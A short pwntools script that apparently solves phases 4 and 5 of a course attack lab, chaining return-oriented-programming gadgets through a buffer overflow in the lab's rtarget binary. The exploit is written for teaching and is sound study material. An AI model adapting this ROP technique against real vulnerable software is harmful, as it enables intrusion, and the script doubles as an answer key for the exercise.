from pwn import *

TARGET = "./rtarget"
context.binary = TARGET
context.terminal = ["tmux", "split-window", "-h"]
# context.update(arch="i386", os="linux")
# context.update(arch="amd64", os="linux")
# context.log_level = "debug"

# p = gdb.debug([TARGET, "-q"], gdbscript="""b *0x4018bb""")
p = process([TARGET, "-q"])

BUFFER_SIZE = 0x18
COOKIE = "0x3c1eff45"
TOUCH2 = 0x0000000000401783
TOUCH3 = 0x0000000000401857

# pop rax == 58
gadget1 = 0x4018ED
# mov rdi, rax == 48 89 c7
gadget2 = 0x401901
# mov ecx, eax == 89 c1
gadget3 = 0x401996
# mov edx, ecx == 89 ca
gadget4 = 0x40192D
# mov esi, edx == 89 d6
gadget5 = 0x4019D1
# mov rax, rsp == 48 89 e0
gadget6 = 0x401969
# lea rax, [rdi+rsi*1] == 48 8d 04 37
gadget7 = 0x401920


def solve_phase_4():
    payload = (
        b"A" * BUFFER_SIZE
        + p64(gadget1)
        + p64(int(COOKIE, 16))
        + p64(gadget2)
        + p64(TOUCH2)
    )
    p.sendline(payload)


def solve_phase_5():
    payload = (
        b"A" * BUFFER_SIZE
        + p64(gadget1)
        + p64(32)
        + p64(gadget3)
        + p64(gadget4)
        + p64(gadget5)
        + p64(gadget6)
        + p64(gadget2)
        + p64(gadget7)
        + p64(gadget2)
        + p64(TOUCH3)
        + COOKIE[2:].encode("utf-8")
        + b"\x00"
    )
    p.sendline(payload)


# solve_phase_4()
# solve_phase_5()
p.interactive()
